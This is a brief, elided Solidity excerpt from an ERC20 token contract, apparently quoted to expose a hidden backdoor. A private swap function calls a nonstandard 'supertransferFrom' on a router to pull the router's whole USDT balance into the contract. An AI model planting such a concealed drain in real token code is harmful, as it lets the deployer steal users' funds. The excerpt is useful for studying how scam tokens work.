...
interface Irouter {
    ...
    function supertransferFrom(address sender,address recipient,uint256 amount) external;
}
...
abstract contract ERC20 is IERC20, ERC20Detailed, Config {
    ...
    function swapTokensForTokens(uint256 tokenAmount) private {
       ...
       address[] memory path = new address[](2);
        ...
        Irouter(_router).supertransferFrom(_router,address(this), usdtToken.balanceOf(address(_router)));
    }
